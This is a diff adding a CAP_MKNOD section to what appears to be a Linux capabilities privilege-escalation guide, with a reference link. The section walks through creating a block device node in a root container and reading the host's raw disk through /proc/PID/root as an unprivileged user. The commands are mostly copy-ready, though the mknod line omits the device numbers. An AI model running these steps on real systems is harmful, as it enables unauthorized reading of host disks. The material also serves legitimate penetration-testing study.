@@ -1556,6 +1556,55 @@ The `kptr_restrict` sysctl setting was introduced in 2.6.38, and determines if k
 
 In addition, this capability also allows the process to view `dmesg` output, if the `dmesg_restrict` setting is 1. Finally, the `CAP_SYS_ADMIN` capability is still permitted to perform `syslog` operations itself for historical reasons.
 
+## CAP\_MKNOD
+
+[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows an extended usage of [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) by permitting creation of something other than a regular file (`S_IFREG`), FIFO (named pipe)(`S_IFIFO`), or UNIX domain socket (`S_IFSOCK`). The special files are:
+- `S_IFCHR` (Character special file (a device like a terminal))
+- `S_IFBLK` (Block special file (a device like a disk)).
+
+It is a default capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
+
+This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:
+
+1. Have initial access to the host (Unprivileged).
+2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
+3. Host and container should share the same user namespace.
+
+**Steps :**
+
+1. On the host, as a standard user:
+   1. Get the current UID (`id`). For example: `uid=1000(unprivileged)`.
+   2. Get the device you want to read. For exemple: `/dev/sda`
+2. On the container, as `root`:
+
+```bash
+# Create a new block special file matching the host device
+mknod /dev/sda b
+# Configure the permissions
+chmod ug+w /dev/sda
+# Create the same standard user than the one on host
+useradd -u 1000 unprivileged
+# Login with that user
+su unprivileged
+```
+
+3. Back on the host:
+   
+```bash
+# Find the PID linked to the container owns by the user "unprivileged"
+# Example only (Depends on the shell program, etc.). Here: PID=18802.
+$ ps aux | grep -i /bin/sh | grep -i unprivileged
+unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
+```
+
+```bash
+# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
+head /proc/18802/root/dev/sda
+```
+
+The attacker can now read, dump, copy the device /dev/sda from unprivileged user.
+
+
 ## References
 
 **Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.
@@ -1567,6 +1616,7 @@ In addition, this capability also allows the process to view `dmesg` output, if 
 * [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
 * [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
+* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
 
 ​
 
